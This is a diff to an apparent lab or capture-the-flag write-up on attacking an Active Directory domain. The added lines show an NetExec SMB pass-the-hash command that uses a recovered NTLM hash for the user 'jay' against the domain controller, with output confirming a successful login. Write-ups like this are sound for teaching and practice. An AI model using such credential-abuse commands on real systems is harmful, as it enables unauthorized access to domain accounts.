@@ -590,6 +590,14 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 I now have the hash!
 
 ```python
+nxc smb dc01.casper.hsm -u jay -H '9b88ec231f4f0e5cb7d9edef1f399f6c' --smb-timeout 5 
+SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.31.82      445    DC01             [+] casper.hsm\jay:9b88ec231f4f0e5cb7d9edef1f399f6c
+```
+
+# Enumeration as `jay`
+
+```python
 
 ```
 
